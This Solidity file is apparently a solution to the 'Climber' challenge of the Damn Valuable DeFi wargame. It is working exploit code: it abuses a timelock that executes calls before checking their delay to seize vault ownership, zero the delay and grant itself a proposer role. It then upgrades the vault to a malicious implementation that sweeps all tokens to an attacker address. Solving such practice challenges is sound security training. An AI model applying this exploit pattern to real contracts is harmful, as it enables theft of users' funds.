// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, PROPOSER_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract Solution {
    bytes[] dataElements;

    function solve(ClimberVault vault, ClimberTimelock timelock) external {
        uint256[] memory values = new uint256[](4);
        address[] memory targets = new address[](4);
        targets[0] = address(vault);
        targets[1] = address(timelock);
        targets[2] = address(timelock);
        targets[3] = address(this);
        dataElements = new bytes[](4);
        // transfer ownership to be able to upgrade the vault
        dataElements[0] = abi.encodeCall(vault.transferOwnership, (address(this)));
        // update the timelock delay
        dataElements[1] = abi.encodeCall(timelock.updateDelay, (0));
        // grant PROPOSER_ROLE to this contract
        dataElements[2] = abi.encodeCall(timelock.grantRole, (PROPOSER_ROLE, address(this)));
        // schedule all calls
        dataElements[3] = abi.encodeCall(this.schedule, (timelock, targets, values, bytes32(0)));
        timelock.execute(targets, values, dataElements, bytes32(0));

        // upgrade the vault
        address sweepImpl = address(new SweepImpl());
        vault.upgradeToAndCall(sweepImpl, "");
    }

    function schedule(ClimberTimelock timelock, address[] calldata targets, uint256[] calldata values, bytes32 salt)
        external
    {
        // this works, because the timelock first calls targets,
        // and then checks for the delay
        timelock.schedule(targets, values, dataElements, salt);
    }
}

contract SweepImpl is ClimberVault {
    function sweep(DamnValuableToken token, address recovery) external {
        token.transfer(recovery, token.balanceOf(address(this)));
    }
}
